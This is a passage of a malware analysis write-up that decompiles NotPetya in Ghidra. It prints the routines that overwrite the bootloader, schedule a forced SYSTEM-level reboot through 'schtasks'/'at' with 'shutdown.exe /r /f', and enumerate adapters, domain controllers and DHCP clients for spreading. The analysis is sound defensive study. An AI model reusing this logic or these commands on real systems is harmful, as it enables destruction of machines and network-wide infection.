                 ff ff
        10001871 a3 f8 f8        MOV        [status_code],EAX                                = ??
                 01 10
        10001876 85 c0           TEST       EAX,EAX
        10001878 78 1b           JS         LAB_10001895
        1000187a 8d 85 68        LEA        EAX=>first_128_bytes_xor_7_len_512,[EBP + 0xff
                 f8 ff ff
        10001880 50              PUSH       EAX
        10001881 8d 85 68        LEA        EAX=>drive_path,[EBP + 0xfffffe68]
                 fe ff ff
        10001887 50              PUSH       EAX
        10001888 6a 22           PUSH       0x22
        1000188a 58              POP        EAX
        1000188b e8 f4 fa        CALL       write_512_offset_EAX                             undefined write_512_offset_EAX(u
                 ff ff
```

From this we can infer that it writes to disk block `0x20` (recall that the argument is left shifted by `9` in the function), disk block `0x21` and disk block `0x22`. Unfortuantely though since all the assignments in this subroutine were giving Ghidra a rather hard time the exact implications are unknown and probably not worth looking into. Afterall, it is probably safe to say that this is the subroutine responsible for writing the custom boot loader to the disk, which is also how we will rename this function to `write_custom_bootloader`.

### Back to destroy_boot

Returning back to the calling function we now have a better idea of the `destroy_boot` function too. It seems appropriate to change its name to also reflect the coordination of writing the custom bootloader, so we rename it to `destroy_boot_and_write_custom_bootloader`.

### Back again to Ordinal_1

After all this we are back in Ordinal_1. The code context we are in is as follows.

```cpp
  if ((granted_privileges & 2) != 0) {
    create_c_windows_file_or_exit();
    destroy_boot_and_write_custom_bootloader();
  }
  FUN_100084df();
```

This means that `FUN_100084df` is next up in our investigation.

### FUN_100084df

```cpp
undefined4 FUN_100084df(void){
  uint uVar1;
  UINT UVar2;
  BOOL BVar3;
  int iVar4;
  wchar_t *pwVar5;
  uint uVar6;
  undefined4 uVar7;
  int iVar8;
  WCHAR local_e2c [1023];
  undefined2 local_62e;
  WCHAR local_62c [780];
  _SYSTEMTIME local_14;
  
  uVar7 = 0;
  GetLocalTime((LPSYSTEMTIME)&local_14);
  uVar1 = FUN_10006973();
  if (uVar1 < 10) {
    uVar1 = 10;
  }
  uVar6 = ((uint)local_14.wHour + (uVar1 + 3) / 0x3c) % 0x18;
  iVar8 = (uint)local_14.wMinute + (uVar1 + 3) % 0x3c;
  UVar2 = GetSystemDirectoryW(local_62c,0x30c);
  if (UVar2 != 0) {
    BVar3 = PathAppendW(local_62c,L"shutdown.exe /r /f");
    if (BVar3 != 0) {
      iVar4 = FUN_10008494();
      if (iVar4 == 0) {
        wsprintfW(local_e2c,L"at %02d:%02d %ws",uVar6,iVar8,local_62c);
      }
      else {
        pwVar5 = L"/RU \"SYSTEM\" ";
        if (((byte)granted_privileges & 4) == 0) {
          pwVar5 = L"";
        }
        wsprintfW(local_e2c,L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d",
                  pwVar5,local_62c,uVar6,iVar8);
      }
      local_62e = 0;
      uVar7 = FUN_100083bd(0);
    }
  }
  return uVar7;
}
```

The subroutine stars with a call to [GetLocalTime](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getlocaltime) which gets the local date and time.

This call is followed directly by a call to `FUN_10006973`.

### FUN_10006973

```cpp
uint FUN_10006973(void){
  DWORD DVar1;
  uint uVar2;
  
  DVar1 = GetTickCount();
  uVar2 = (uint)(((ulonglong)(DVar1 - millis_since_system_start) / 0x3c) / 1000);
  return -(uint)(uVar2 < first_cmd_arg) & first_cmd_arg - uVar2;
}
```

This function makes a call to [GetTickCount](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount) which returns the number of milliseconds elapsed since the system was started. The difference between this value and the similarly obtained value of `millis_since_system_start` gotten when the malware was initially started is then computed and divided by `0x3c` which is `60` followed by `1000`. This effectively makes `uVar2` the number of minutes the malware has been running for.

The return value is weird however. The left side of the `&` results in either `-1` or `0`. While the right side. This effectively makes this statement a switch. Afterall, the value of `-1` written out in binary is all `1's` meaning a bit wise AND on it will keep all bits set in the other value. This means that the actual return value is the difference between `first_cmd_arg` and `uVar2` or `0` if `uVar2` is greater than `first_cmd_arg`. Renaming the function to `minutes_left_before_cmd_arg1_reached` seems fine.

### Back to FUN_100084df

Back to the calling function we then see that if less than `10` minutes are left the value is set to `10` minutes.

Using this value we then see the `wHour` and `wMinute` field being set.

```cpp
uVar6 = ((uint)local_14.wHour + (uVar1 + 3) / 0x3c) % 0x18;
iVar8 = (uint)local_14.wMinute + (uVar1 + 3) % 0x3c;
```

For the hours field the value is first converted from minutes to hours using `0x3c` (`60`). Both values are kept within bounds using a modulus operating with `0x18` (`24`) and `0x3c` (`60`) respectively.

Next we see a calls to [GetSystemDirectoryW](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectoryw) to get the system directory path (generally `C:\Windows\System32`).

Next we see a call to [PathAppendW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathappendw) being used to extend this path with the string `shutdown.exe /r /f` resulting in `C:\Windows\System32\shutdown.exe /r /f`.

If not errors occurred we see a call to `FUN_10008494`.

### FUN_10008494

```cpp
undefined4 FUN_10008494(void){
  BOOL BVar1;
  undefined4 uVar2;
  _OSVERSIONINFOW local_118;
  
  uVar2 = 0;
  memset(&local_118,0,0x114);
  local_118.dwOSVersionInfoSize = 0x114;
  BVar1 = GetVersionExW((LPOSVERSIONINFOW)&local_118);
  if ((BVar1 != 0) && (5 < local_118.dwMajorVersion)) {
    uVar2 = 1;
  }
  return uVar2;
}
```

This function appears mostly centered around the call to [GetVersionExW](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexw). Assuming that NotPetya is manifested for a specific operating system this gets the version that the application is manifested for. Otherwise it returns the OS version value. Though in either case the comparison right after it checks for a value greater than 5 for the major version. This targets all OS versions Windows 8 and up as Windows 8 has major version number 6. So lets rename the function to `running_win_8_or_higher`.

### Back to FUN_100084df

Judging by how the return value of the function call is used there is separate logic for old and new versions of Windows. However the logic for old versions seems to consist of just calling [wsprintfW](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-wsprintfw) to format a time string of the format `at hh:mm C:\Windows\System32\shutdown.exe /r /f` the value of which is stored in `local_e2c`.

For newer version there seems to be more going on. First of all a check is made for the permission `4` which was `SeTcbPrivilege` going by the following [SO answer](https://stackoverflow.com/questions/5294171/when-is-setcbprivilege-used-act-as-part-of-the-operating-system) this allows you to run tasks as any user. This by extensions makes the line above the if statement make more sense. So if this permission is granted the tasks that will be scheduled later will be executed as the `SYSTEM` account.

Next a string is printed again of the format `schtasks /RU "SYSTEM" /Create /SC once /TN "" /TR "C:\Windows\System32\shutdown.exe /r /f" /ST hh:mm`.

Both of these strings represent a forceful reboot of the system at the generated time.

Finally we see a call being made to `FUN_100083bd`. After assigning `0` to `local_62e` this sems to have no real purpose and it just so happens to be stored directly after our `WCHAR` buffer for the entire command and be of size 2. It is likely that we can jointhese two data types. Doing so seems to work correctly and reveals that the last character of the buffer is set to `\0` to terminate the string.

### FUN_100083bd

```cpp
BOOL FUN_100083bd(int param_1){
  int in_EAX;
  DWORD DVar1;
  UINT UVar2;
  LPWSTR pWVar3;
  _PROCESS_INFORMATION *p_Var4;
  _STARTUPINFOW *p_Var5;
  BOOL BVar6;
  int iVar7;
  WCHAR local_e70 [1024];
  WCHAR local_670 [780];
  _STARTUPINFOW local_58;
  _PROCESS_INFORMATION local_14;
  
  wsprintfW(local_e70,L"/c %ws");
  *(undefined2 *)(in_EAX + 0x7fe) = 0;
  DVar1 = GetEnvironmentVariableW(L"ComSpec",local_670,0x30c);
  if (DVar1 == 0) {
    UVar2 = GetSystemDirectoryW(local_670,0x30c);
    if (UVar2 == 0) {
      return 0;
    }
    pWVar3 = lstrcatW(local_670,L"\\cmd.exe");
    if (pWVar3 == (LPWSTR)0x0) {
      return 0;
    }
  }
  iVar7 = 0x10;
  p_Var4 = &local_14;
  do {
    *(undefined *)&p_Var4->hProcess = 0;
    p_Var4 = (_PROCESS_INFORMATION *)((int)&p_Var4->hProcess + 1);
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  iVar7 = 0x44;
  p_Var5 = &local_58;
  do {
    *(undefined *)&p_Var5->cb = 0;
    p_Var5 = (_STARTUPINFOW *)((int)&p_Var5->cb + 1);
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  local_58.cb = 0x44;
  BVar6 = CreateProcessW(local_670,local_e70,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,(LPSTARTUPINFOW)&local_58,
                         (LPPROCESS_INFORMATION)&local_14);
  if (BVar6 != 0) {
    Sleep(param_1 * 1000);
  }
  return BVar6;
}
```

This function appears to be fairly complex, unexpectedly so. The first line we see is:

```cpp
wsprintfW(local_e70,L"/c %ws");
```

This however, makes no sense, the format string specified here has one variable in it and this variable is not provided. Therefore we will start be changing the entire signature for the call.

Doing this reveals a lot of, expected information.

```cpp
wsprintfW(local_e70,L"/c %ws",in_EAX);
in_EAX[0x3ff] = L'\0';
```

The type of `in_EAX` was respecified as a wide character pointer. Although we did not confirm it, the string used here is most likely the schedule task command from the calling function which would otherwise go unused. 

Next we see the value of the `ComSpec` environment variable being retried and stored in `local_670` using a call to [GetEnvironmentVariableW](https://docs.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew). Normally this gets the command line interpreter on Windows. If this failed a call is made to get the system directory and a concatenation with `\\cmd.exe`.

After a reference for some commandline interpreter has been obtained a new process is started using [CreateProcessW](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw). This process simply executes the final command string.

After all this the thread is put to sleep by the number of seconds specified in the function call. From the calling function we came from this value is `0`.

So in effect, all this function does is execute the given commandline task. So we can rename the subroutien to `execute_command`.

### Back to FUN_100084df

Given everything we've renamed the function now looks like the following:

```cpp
undefined4 FUN_100084df(void)

{
  uint minutes_left;
  UINT success;
  BOOL success2;
  int win8up;
  wchar_t *user;
  uint hour;
  undefined4 ret_val;
  int minute;
  WCHAR schedule_cmd [1024];
  WCHAR sys_dir [780];
  _SYSTEMTIME time;
  
  ret_val = 0;
  GetLocalTime((LPSYSTEMTIME)&time);
  minutes_left = minutes_left_before_cmd_arg1_reached();
  if (minutes_left < 10) {
    minutes_left = 10;
  }
  hour = ((uint)time.wHour + (minutes_left + 3) / 0x3c) % 0x18;
  minute = (uint)time.wMinute + (minutes_left + 3) % 0x3c;
  success = GetSystemDirectoryW(sys_dir,0x30c);
  if (success != 0) {
    success2 = PathAppendW(sys_dir,L"shutdown.exe /r /f");
    if (success2 != 0) {
      win8up = running_win_8_or_higher();
      if (win8up == 0) {
        wsprintfW(schedule_cmd,L"at %02d:%02d %ws",hour,minute,sys_dir);
      }
      else {
        user = L"/RU \"SYSTEM\" ";
        if (((byte)granted_privileges & 4) == 0) {
          user = L"";
        }
        wsprintfW(schedule_cmd,L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d",
                  user,sys_dir,hour,minute);
      }
      schedule_cmd[1023] = L'\0';
      ret_val = execute_command(0);
    }
  }
  return ret_val;
}
```

And it's purpose is just to schedule a reboot of the system at a time in the future. So we'll rename the function to `schedule_reboot`.

### Back to Ordinal_1

The next thing we see is a thread being started that runs `FUN_10007c10`.

```cpp
CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007c10,(LPVOID)0x0,0,(LPDWORD)0x0);
```

### FUN_10007c10

```cpp
void FUN_10007c10(void){
  bool bVar1;
  LPVOID lpParameter;
  BOOL BVar2;
  WCHAR local_210 [260];
  DWORD local_8;
  
  lpParameter = critical_section_no_extra_debug;
  possible_lock_and_wait_check_args(critical_section_no_extra_debug);
  possible_lock_and_wait_check_args(lpParameter);
  local_8 = 0x104;
  BVar2 = GetComputerNameExW(ComputerNamePhysicalNetBIOS,local_210,&local_8);
  if (BVar2 != 0) {
    possible_lock_and_wait_check_args(lpParameter);
  }
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10008e7f,lpParameter,0,(LPDWORD)0x0);
  bVar1 = false;
  do {
    FUN_1000777b(lpParameter);
    FUN_1000786b(lpParameter);
    if (!bVar1) {
      FUN_1000795a(lpParameter,0x80000000,0);
      bVar1 = true;
    }
    Sleep(180000);
  } while( true );
}
```

The first thing we see is a call to [GetComputerNameExW](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw). With the [ComputerNameNetBIOS](https://docs.microsoft.com/nl-nl/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format) argument this gets the NetBIOS name of the computer, this name is then stored in `local_210`. It should be noted that since `EAX` is passed to `possible_lock_and_wait_check_args` and since `local_210` is stored in `EAX` this name is passed to the function.

The next thing we see is a thread being created to run `FUN_10008e7f`.

### FUN_10008e7f

```cpp
undefined4 FUN_10008e7f(undefined4 param_1){
  int iVar1;
  uint uVar2;
  LPWSTR lpMem;
  HANDLE hHeap;
  undefined4 *lpParameter;
  undefined4 uVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *unaff_EDI;
  int *piVar6;
  DWORD dwFlags;
  int iVar7;
  undefined4 *puVar8;
  HANDLE local_3018;
  int *piStack12308;
  undefined4 local_3010 [2];
  undefined4 local_3008;
  undefined local_3004 [4072];
  uint auStack8220 [5];
  undefined4 local_2008;
  undefined local_2004 [8184];
  undefined4 uStack12;
  
  uStack12 = 0x10008e8f;
  puVar5 = (undefined4 *)0x0;
  local_3008 = 0;
  memset(local_3004,0,0xffc);
  local_2008 = 0;
  memset(local_2004,0,0x1ffc);
  puVar8 = local_3010;
  iVar7 = 0;
  local_3010[0] = 0;
  local_3018 = (HANDLE)0x0;
  iVar1 = GetAdaptersInfo();
  if ((iVar1 == 0x6f) && (piVar6 = (int *)LocalAlloc(0x40,(SIZE_T)local_3018), piVar6 != (int *)0x0)
     ) {
    piStack12308 = piVar6;
    iVar1 = GetAdaptersInfo(piVar6,&local_3018);
    if (iVar1 == 0) {
      do {
        if ((undefined4 *)0x3ff < puVar8) break;
        uVar2 = Ordinal_11(piVar6 + 0x6c);
        auStack8220[iVar7 * 2] = uVar2;
        uVar2 = Ordinal_11(piVar6 + 0x70);
        auStack8220[(int)puVar8 * 2 + 2] = uVar2;
        lpMem = FUN_10006916((LPCSTR)(piVar6 + 0x6c));
        if (lpMem != (LPWSTR)0x0) {
          possible_lock_and_wait_check_args(param_1);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        if ((piVar6[0x69] != 0) &&
           (lpMem = FUN_10006916((LPCSTR)(piVar6 + 0x80)), lpMem != (LPWSTR)0x0)) {
          possible_lock_and_wait_check_args(param_1);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        piVar6 = (int *)*piVar6;
        puVar8 = (undefined4 *)((int)puVar8 + 1);
      } while (piVar6 != (int *)0x0);
      iVar1 = FUN_10008243();
      if (iVar1 != 0) {
        FUN_1000908a(param_1);
      }
      if (puVar8 != (undefined4 *)0x0) {
        do {
          lpParameter = (undefined4 *)LocalAlloc(0x40,0xc);
          if (lpParameter != (undefined4 *)0x0) {
            uVar2 = Ordinal_11("255.255.255.255");
            uVar4 = auStack8220[(int)unaff_EDI * 2 + 1] & auStack8220[(int)unaff_EDI * 2 + 2];
            if ((uVar4 != 0) && ((uVar2 ^ auStack8220[(int)unaff_EDI * 2 + 2] | uVar4) != 0)) {
              uVar3 = Ordinal_14(uVar4);
              *lpParameter = uVar3;
              uVar3 = Ordinal_14(unaff_EDI);
              lpParameter[1] = uVar3;
              lpParameter[2] = param_1;
              hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10008e04,lpParameter,0,
                                   (LPDWORD)0x0);
              if (hHeap != (HANDLE)0x0) {
                (&local_3018)[(int)unaff_EDI] = hHeap;
              }
            }
          }
          unaff_EDI = (undefined4 *)((int)unaff_EDI + 1);
        } while (unaff_EDI < puVar8);
      }
      if (unaff_EDI != (undefined4 *)0x0) {
        do {
          CloseHandle((&local_3018)[(int)puVar5]);
          puVar5 = (undefined4 *)((int)puVar5 + 1);
        } while (puVar5 < unaff_EDI);
      }
    }
    LocalFree((HLOCAL)0x0);
  }
  return 0;
}
```

One of the first things we see here is a call to [GetAdaptersInfo](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo). The syntax is incorrect however, it is missing the parameters that are expected according to the MSDN documentation. On close inspecting this appears to be the case because the required structs are missing, so we'll have to add these.

After adding these the decompilation result definitely becomes clearer, the same goes for after we resolve the true identity of the `Oridinal` calls from `WS2_32.dll`. The decompilation result is still far from perfect though and it's trivial to see that there are many mistakes. Nevertheless it might be enough to assertain the function of the subroutine.

```cpp
undefined4 FUN_10008e7f(u_long param_1){
  ULONG UVar1;
  ulong uVar2;
  LPWSTR lpMem;
  HANDLE hHeap;
  int iVar3;
  u_long *lpParameter;
  uint netlong;
  u_long uVar4;
  uint netlong_00;
  uint uVar5;
  _IP_ADAPTER_INFO *local_EDI_150;
  DWORD dwFlags;
  uint local_301c;
  uint local_3018;
  ULONG local_3010;
  _IP_ADAPTER_INFO *p_Stack12300;
  HANDLE local_3008;
  undefined local_3004 [4092];
  uint local_2008 [2047];
  undefined4 uStack12;
  
  uStack12 = 0x10008e8f;
  uVar5 = 0;
  local_3008 = (HANDLE)0x0;
  memset(local_3004,0,0xffc);
  local_2008[0] = 0;
  memset(local_2008[1],0,0x1ffc);
  local_3010 = 0;
  local_301c = 0;
  local_3018 = 0;
  UVar1 = GetAdaptersInfo((_IP_ADAPTER_INFO *)0x0,&local_3010);
  if ((UVar1 == 0x6f) &&
     (local_EDI_150 = (_IP_ADAPTER_INFO *)LocalAlloc(0x40,local_3010),
     local_EDI_150 != (_IP_ADAPTER_INFO *)0x0)) {
    p_Stack12300 = local_EDI_150;
    UVar1 = GetAdaptersInfo(local_EDI_150,&local_3010);
    if (UVar1 == 0) {
      do {
        if (0x3ff < local_301c) break;
        uVar2 = inet_addr((local_EDI_150->CurrentIpAddress).IpAddress.String + 4);
        local_2008[local_301c * 2] = uVar2;
        uVar2 = inet_addr((local_EDI_150->CurrentIpAddress).IpMask.String + 4);
        local_2008[1][local_301c * 2] = uVar2;
        lpMem = FUN_10006916((local_EDI_150->CurrentIpAddress).IpAddress.String + 4);
        if (lpMem != (LPWSTR)0x0) {
          possible_lock_and_wait_check_args(param_1);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        if ((local_EDI_150->DhcpEnabled != 0) &&
           (lpMem = FUN_10006916((local_EDI_150->GatewayList).IpAddress.String + 4),
           lpMem != (LPWSTR)0x0)) {
          possible_lock_and_wait_check_args(param_1);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        local_EDI_150 = local_EDI_150->Next;
        local_301c = local_301c + 1;
      } while (local_EDI_150 != (_IP_ADAPTER_INFO *)0x0);
      iVar3 = FUN_10008243();
      if (iVar3 != 0) {
        FUN_1000908a(param_1);
      }
      if (local_301c != 0) {
        do {
          lpParameter = (u_long *)LocalAlloc(0x40,0xc);
          if (lpParameter != (u_long *)0x0) {
            uVar2 = inet_addr("255.255.255.255");
            netlong_00 = local_2008[local_3018 * 2] & local_2008[1][local_3018 * 2];
            if ((netlong_00 != 0) &&
               (netlong = uVar2 ^ local_2008[1][local_3018 * 2] | netlong_00, netlong != 0)) {
              uVar4 = htonl(netlong_00);
              *lpParameter = uVar4;
              uVar4 = htonl(netlong);
              lpParameter[1] = uVar4;
              lpParameter[2] = param_1;
              hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10008e04,lpParameter,0,
                                   (LPDWORD)0x0);
              if (hHeap != (HANDLE)0x0) {
                (&local_3008)[local_3018] = hHeap;
              }
            }
          }
          local_3018 = local_3018 + 1;
        } while (local_3018 < local_301c);
      }
      if (local_3018 != 0) {
        do {
          CloseHandle((&local_3008)[uVar5]);
          uVar5 = uVar5 + 1;
        } while (uVar5 < local_3018);
      }
    }
    LocalFree(p_Stack12300);
  }
  return 0;
}
```

The [GetAdaptersInfo](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo) call get the information for all the network adapters in the system. The return code that is being checked again is `0x6f` which maps to the `ERROR_BUFFER_OVERFLOW` constant. This error code is always returned if the adapter info struct pass is `NULL` as is the case here. This call is however not meaningless as the amount of space that would've been required to store the result is stored in `local_3010`.

It is then also no surprise to see a buffer of size `local_3010` being created and a second call to `GetAdaptersInfo`. This time however the error code checked against is `0` which stands for `ERROR_SUCCESS`.

Next we see two calls to [inet_addr](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr) being used to convert the returned current ip address and address mask from a string to an address to be used in the [in_addr](https://docs.microsoft.com/nl-nl/windows/win32/api/winsock2/ns-winsock2-in_addr) structure.

After these two conversion there is a call to `FUN_10006916` with the ip address.

### FUN_10006916

```cpp
LPWSTR FUN_10006916(LPCSTR param_1){
  int cchWideChar;
  HANDLE hHeap;
  LPWSTR lpWideCharStr;
  DWORD dwFlags;
  SIZE_T dwBytes;
  
  cchWideChar = MultiByteToWideChar(0xfde9,0,param_1,-1,(LPWSTR)0x0,0);
  if (cchWideChar != 0) {
    dwBytes = cchWideChar * 2;
    dwFlags = 0;
    hHeap = GetProcessHeap();
    lpWideCharStr = (LPWSTR)HeapAlloc(hHeap,dwFlags,dwBytes);
    if ((lpWideCharStr != (LPWSTR)0x0) &&
       (cchWideChar = MultiByteToWideChar(0xfde9,0,param_1,-1,lpWideCharStr,cchWideChar),
       cchWideChar != 0)) {
      return lpWideCharStr;
    }
  }
  return (LPWSTR)0x0;
}
```

Given that I've used the code that is shown here before myself it is instantly clear that this is simply a standard conversion from an `LPCSTR` to a `LPWSTR` meaning we can simply rename this and continue in the calling function.

### Back in FUN_10008e7f

We see that the `possible_lock_and_wait_check_args` function is invoked again with the just created LPWSTR (which is passed via `EAX`). After this call the memory used by the `LPWSTR` is freed.

Next we see a similar setup where if DHCP is enabled the gateway IP is converted to a `LPWSTR` and passed to `possible_lock_and_wait_check_args`. Evidently these functions do more than we gave them credit for so far.

It should also be noted that everything done with these IP addresses is doen for each adapter as it is all inside a do loop.

Directly after the do loop is a call to the `FUN_10008243` subroutine.

### FUN_10008243

```cpp
undefined4 FUN_10008243(void){
  DWORD DVar1;
  ushort unaff_SI;
  undefined4 uVar2;
  int local_8;
  
  uVar2 = 0;
  local_8 = 0;
  DVar1 = NetServerGetInfo((char *)0x0,0x65,&stack0xfffffff8,unaff_SI,(ushort *)0x0);
  if ((DVar1 == 0) &&
     (((*(uint *)(local_8 + 0x10) & 0x8000) != 0 || ((*(uint *)(local_8 + 0x10) & 0x18) != 0)))) {
    uVar2 = 1;
  }
  if (local_8 != 0) {
    NetApiBufferFree();
  }
  return uVar2;
}
```

The first thing we see in this function is a call to [NetServerGetInfo](https://docs.microsoft.com/en-us/windows/win32/api/lmserver/nf-lmserver-netservergetinfo) this call gets the current configuration infomration for the specified server. The server specified here is `NULL` which translates to the local computer. The level of `0x65` or `101` refers to the [SERVER_INFO_101](https://docs.microsoft.com/nl-nl/windows/win32/api/lmserver/ns-lmserver-server_info_101) structure. However, we then notice something weird, the call is given 5 arguments, however it should only take 3 according to the MSDN documentation. It turns out that the name of the function was exactly the same as a different function and Ghidra is in fact using the wrong function here, in fact the correct one isn't present in Ghidra's database. So we add the required typedef's and edit the function signature. Doing this massively cleans up the decompilation for this function. In addition we can now identify and add the `SERVER_INFO_101` structure. Retyping `local_8` to the correct struct and fixing up the [NetApiBufferFree](https://docs.microsoft.com/en-us/windows/win32/api/lmapibuf/nf-lmapibuf-netapibufferfree) call without arguments we see at the end of the function massively cleans up the decompilatiol resulting giving.

```cpp
undefined4 FUN_10008243(void){
  DWORD DVar1;
  undefined4 uVar2;
  SERVER_INFO_101 *local_8;
  
  uVar2 = 0;
  local_8 = (SERVER_INFO_101 *)0x0;
  DVar1 = NetServerGetInfo((LMSTR)0x0,0x65,(LPBYTE *)&local_8);
  if ((DVar1 == 0) && (((local_8->sv101_type & 0x8000) != 0 || ((local_8->sv101_type & 0x18) != 0)))
     ) {
    uVar2 = 1;
  }
  if (local_8 != (SERVER_INFO_101 *)0x0) {
    NetApiBufferFree(local_8);
  }
  return uVar2;
}
```

It should be noted that Ghidra gives us a warning about `local_8`.

```
/* WARNING: Variable defined which should be unmapped: local_8 */
```

Probably this parameter is just passing through from the function calling `FUN_10008243` which also explains why it isn't explicitly allocated any memory here. The buffer is however freed in this function. This all might be the result of a compiler optimisation.

As for the function itself it checks the `sv101_type` against `0` with the `0x8000` mask and the `0x18`. Breaking down `0x18` gives us `0x10 + 0x8`. Putting this all together the check esstentially only allows the following server software types to pass.

- SV\_TYPE\_DOMAIN\_CTRL - A primary domain controller. 
- SV\_TYPE\_DOMAIN\_BAKCTRL - A backup domain controller. 
- SV\_TYPE\_SERVER\_NT - Any server that is not a domain controller. 

And rejects the following types.

- SV\_TYPE\_WORKSTATION
- SV\_TYPE\_SERVER
- SV\_TYPE\_SQLSERVER
- SV\_TYPE\_TIME\_SOURCE
- SV\_TYPE\_AFP
- SV\_TYPE\_NOVELL
- SV\_TYPE\_DOMAIN\_MEMBER
- SV\_TYPE\_PRINTQ\_SERVER
- SV\_TYPE\_DIALIN\_SERVER
- SV\_TYPE\_XENIX\_SERVER
- SV\_TYPE\_NT
- SV\_TYPE\_WFW
- SV\_TYPE\_SERVER\_MFPN
- SV\_TYPE\_POTENTIAL\_BROWSER
- SV\_TYPE\_BACKUP\_BROWSER
- SV\_TYPE\_MASTER\_BROWSER
- SV\_TYPE\_DOMAIN\_MASTER
- SV\_TYPE\_SERVER\_OSF
- SV\_TYPE\_SERVER\_VMS
- SV\_TYPE\_WINDOWS
- SV\_TYPE\_DFS
- SV\_TYPE\_CLUSTER\_NT
- SV\_TYPE\_TERMINALSERVER
- SV\_TYPE\_CLUSTER\_VS\_NT
- SV\_TYPE\_DCE
- SV\_TYPE\_ALTERNATE\_XPORT
- SV\_TYPE\_LOCAL\_LIST\_ONLY
- SV\_TYPE\_DOMAIN\_ENUM

Given this extra information we can rename the subroutine to `running_domain_controller_or_not_a_domain_controller`. Which appears as a tautology, but in reality this probably depends on what exactly "Any server that is not a domain controller" means. Either way the subroutine returns `1` if any of these 3 server software types were running on teh computer.

### Back to FUN_10008e7f

Back in the calling function we see that `FUN_1000908a` is executed with `param_1` which is the critical section object, but only if we were running any of the 3 server software types just checked for.

### FUN_1000908a

```cpp
undefined4 FUN_1000908a(undefined4 param_1){
  LPDHCP_CLIENT_INFO p_Var1;
  DWORD dwFlags;
  u_long uVar2;
  int iVar3;
  LPCSTR pCVar4;
  LPWSTR lpMem;
  HANDLE hHeap;
  uint uVar5;
  uint uVar6;
  WCHAR local_248 [260];
  DWORD local_40;
  uint local_3c;
  DWORD local_38;
  uint local_34;
  DHCP_RESUME_HANDLE local_30;
  DHCP_RESUME_HANDLE local_2c;
  DWORD local_28;
  DWORD local_24;
  DWORD local_20;
  uint local_1c;
  uint local_18;
  LPDHCP_SUBNET_INFO local_14;
  LPDHCP_CLIENT_INFO_ARRAY local_10;
  LPDHCP_IP_ARRAY local_c [2];
  
  uVar5 = 0;
  uVar6 = 0;
  local_30 = 0;
  local_2c = 0;
  local_c[0] = (LPDHCP_IP_ARRAY)0x0;
  local_14 = (LPDHCP_SUBNET_INFO)0x0;
  local_10 = (LPDHCP_CLIENT_INFO_ARRAY)0x0;
  local_1c = 0;
  local_18 = 0;
  local_20 = 0;
  local_28 = 0;
  local_24 = 0;
  local_40 = 0;
  local_38 = 0x104;
  GetComputerNameExW(ComputerNamePhysicalNetBIOS,local_248,&local_38);
  dwFlags = DhcpEnumSubnets(local_248,&local_30,0x400,local_c,&local_20,&local_28);
  if (dwFlags == 0) {
    local_3c = local_c[0]->NumElements;
    if (local_3c != 0) {
      do {
        dwFlags = DhcpGetSubnetInfo((WCHAR *)0x0,local_c[0]->Elements[uVar5],&local_14);
        if ((dwFlags == 0) && (local_14->SubnetState == DhcpSubnetEnabled)) {
          dwFlags = DhcpEnumSubnetClients
                              ((WCHAR *)0x0,local_c[0]->Elements[uVar5],&local_2c,0x10000,&local_10,
                               &local_24,&local_40);
          if (dwFlags == 0) {
            local_34 = local_10->NumElements;
            if ((local_34 != 0) && (uVar6 < local_34)) {
              do {
                p_Var1 = local_10->Clients[uVar6];
                if (p_Var1 != (LPDHCP_CLIENT_INFO)0x0) {
                  uVar2 = htonl(p_Var1->ClientIpAddress);
                  iVar3 = FUN_1000a3d9(uVar2);
                  if (iVar3 != 0) {
                    uVar2 = htonl(p_Var1->ClientIpAddress);
                    pCVar4 = (LPCSTR)Ordinal_12(uVar2);
                    lpMem = lpcstr_to_lpwstr(pCVar4);
                    if (lpMem != (LPWSTR)0x0) {
                      possible_lock_and_wait_check_args(param_1);
                      dwFlags = 0;
                      hHeap = GetProcessHeap();
                      HeapFree(hHeap,dwFlags,lpMem);
                    }
                  }
                }
                uVar6 = local_18 + 1;
                local_18 = uVar6;
              } while (uVar6 < local_34);
            }
            DhcpRpcFreeMemory(local_10);
          }
        }
        uVar5 = local_1c + 1;
        local_1c = uVar5;
      } while (uVar5 < local_3c);
    }
    DhcpRpcFreeMemory(local_c[0]);
  }
  return 0;
}
```

